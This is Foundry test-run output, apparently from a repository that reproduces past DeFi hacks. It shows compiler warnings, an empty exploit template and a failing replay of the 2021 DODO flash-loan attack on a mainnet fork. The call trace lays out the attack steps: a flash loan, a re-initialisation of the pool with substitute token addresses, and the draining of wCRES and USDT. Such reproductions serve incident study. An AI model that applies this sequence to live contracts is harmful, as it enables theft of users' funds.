Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.31s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 316.17ms (128.58µs CPU time)

Ran 1 test for src/test/2021-03/dodo_flashloan_exp.sol:ContractTest
[FAIL. Reason: revert: FLASH_LOAN_FAILED] testExploit() (gas: 252007)
Logs:
  FlashLoan WBNB Balance: 130000000000000000000000
  After Exploit completed, wCRES Balance: 130000000000000000000000
  After Exploit completed, USDT Balance: 1100000000000

Traces:
  [5216] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 12000000 [1.2e7])
    │   └─ ← [Return] 0
    └─ ← [Stop] 

  [252007] ContractTest::testExploit()
    ├─ [242549] 0x051EBD717311350f1684f89335bed4ABd083a2b6::flashLoan(130000000000000000000000 [1.3e23], 1100000000000 [1.1e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7768617465766572)
    │   ├─ [239839] 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445::flashLoan(130000000000000000000000 [1.3e23], 1100000000000 [1.1e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7768617465766572) [delegatecall]
    │   │   ├─ [29955] 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 130000000000000000000000 [1.3e23])
    │   │   │   ├─ emit Transfer(from: 0x051EBD717311350f1684f89335bed4ABd083a2b6, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 130000000000000000000000 [1.3e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [41601] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1100000000000 [1.1e12])
    │   │   │   ├─ emit Transfer(from: 0x051EBD717311350f1684f89335bed4ABd083a2b6, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1100000000000 [1.1e12])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [138654] ContractTest::DVMFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 130000000000000000000000 [1.3e23], 1100000000000 [1.1e12], 0x7768617465766572)
    │   │   │   ├─ [441] 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 130000000000000000000000 [1.3e23]
    │   │   │   ├─ emit log_named_uint(key: "FlashLoan WBNB Balance", val: 130000000000000000000000 [1.3e23])
    │   │   │   ├─ [42541] 0x051EBD717311350f1684f89335bed4ABd083a2b6::init(0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0, 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8, 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010, 3000000000000000 [3e15], 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01, 1, 1000000000000000000 [1e18], false)
    │   │   │   │   ├─ [42330] 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445::init(0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0, 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8, 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010, 3000000000000000 [3e15], 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01, 1, 1000000000000000000 [1e18], false) [delegatecall]
    │   │   │   │   │   ├─ [4964] 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8::decimals() [staticcall]
    │   │   │   │   │   │   ├─ [2298] 0x85351262f7474Ebe23FfAcD633cf20A491F1325D::decimals() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 
    │   │   │   ├─ [441] 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 130000000000000000000000 [1.3e23]
    │   │   │   ├─ [25155] 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 130000000000000000000000 [1.3e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 130000000000000000000000 [1.3e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 1100000000000 [1.1e12]
    │   │   │   ├─ [28801] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 1100000000000 [1.1e12])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 1100000000000 [1.1e12])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [441] 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   │   │   └─ ← [Return] 130000000000000000000000 [1.3e23]
    │   │   │   ├─ emit log_named_uint(key: "After Exploit completed, wCRES Balance", val: 130000000000000000000000 [1.3e23])
    │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [4835] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 0)
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 0)
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   │   │   └─ ← [Return] 1100000000000 [1.1e12]
    │   │   │   ├─ emit log_named_uint(key: "After Exploit completed, USDT Balance", val: 1100000000000 [1.1e12])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [2636] 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8::balanceOf(0x051EBD717311350f1684f89335bed4ABd083a2b6) [staticcall]
    │   │   │   ├─ [2464] 0x85351262f7474Ebe23FfAcD633cf20A491F1325D::balanceOf(0x051EBD717311350f1684f89335bed4ABd083a2b6) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2636] 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010::balanceOf(0x051EBD717311350f1684f89335bed4ABd083a2b6) [staticcall]
    │   │   │   ├─ [2464] 0x85351262f7474Ebe23FfAcD633cf20A491F1325D::balanceOf(0x051EBD717311350f1684f89335bed4ABd083a2b6) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Revert] revert: FLASH_LOAN_FAILED
    │   └─ ← [Revert] revert: FLASH_LOAN_FAILED
    └─ ← [Revert] revert: FLASH_LOAN_FAILED

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 362.05ms (3.32ms CPU time)

Ran 2 test suites in 363.74ms (678.22ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in src/test/2021-03/dodo_flashloan_exp.sol:ContractTest
[FAIL. Reason: revert: FLASH_LOAN_FAILED] testExploit() (gas: 252007)

Encountered a total of 1 failing tests, 1 tests succeeded
